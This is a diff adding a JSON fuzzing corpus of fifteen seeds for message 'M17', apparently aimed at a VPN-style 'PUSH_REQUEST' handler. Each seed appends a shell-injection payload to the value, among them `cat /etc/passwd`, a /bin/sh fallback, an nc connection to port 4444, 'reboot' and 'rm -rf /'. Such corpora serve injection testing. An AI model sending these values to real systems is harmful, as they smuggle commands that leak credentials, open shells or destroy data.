@@ -1,0 +1,47 @@
+{
+  "S1": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; id", "op": "r", "size": "-"}
+  ],
+  "S2": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST && uname -a", "op": "r", "size": "-"}
+  ],
+  "S3": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST `cat /etc/passwd`", "op": "r", "size": "-"}
+  ],
+  "S4": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST || /bin/sh", "op": "r", "size": "-"}
+  ],
+  "S5": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; ping -c 1 127.0.0.1;", "op": "r", "size": "-"}
+  ],
+  "S6": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST$(id)", "op": "r", "size": "-"}
+  ],
+  "S7": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST \"; touch /tmp/fuzz_success;\"", "op": "r", "size": "-"}
+  ],
+  "S8": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST & nc 127.0.0.1 4444 &", "op": "r", "size": "-"}
+  ],
+  "S9": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST | /usr/bin/id", "op": "r", "size": "-"}
+  ],
+  "S10": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;reboot", "op": "r", "size": "-"}
+  ],
+  "S11": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\n/bin/id\n", "op": "r", "size": "-"}
+  ],
+  "S12": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; curl http://127.0.0.1/log", "op": "r", "size": "-"}
+  ],
+  "S13": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST`whoami`", "op": "r", "size": "-"}
+  ],
+  "S14": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; env", "op": "r", "size": "-"}
+  ],
+  "S15": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; rm -rf / ;", "op": "r", "size": "-"}
+  ]
+}
